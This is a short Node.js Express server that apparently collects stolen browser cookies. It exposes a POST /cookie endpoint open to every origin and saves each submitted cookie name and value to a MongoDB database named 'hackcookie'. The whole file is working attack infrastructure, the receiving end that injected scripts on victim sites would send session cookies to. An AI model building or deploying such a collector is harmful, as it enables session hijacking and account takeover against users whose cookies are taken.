const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const app = express();

const corsOptions = {
  origin: "*",
  credentials: true, //access-control-allow-credentials:true
  optionSuccessStatus: 200,
};

app.use(cors(corsOptions));

app.use(express.json());

const Cookie = require("./cookieModel");
try {
  mongoose.connect("mongodb://localhost:27017/hackcookie");
  console.log("Connect database successfully");
} catch (error) {
  console.log(error);
}

app.post("/cookie", async (req, res) => {
  try {
    const { name, value } = req.body;
    const saveCookie = await Cookie.create({ name, value });
    res.json(saveCookie);
  } catch (error) {
    res.json(error);
  }
});

app.listen(3000, () => {
  try {
    console.log("Server is running");
  } catch (error) {
    console.log(error);
  }
});
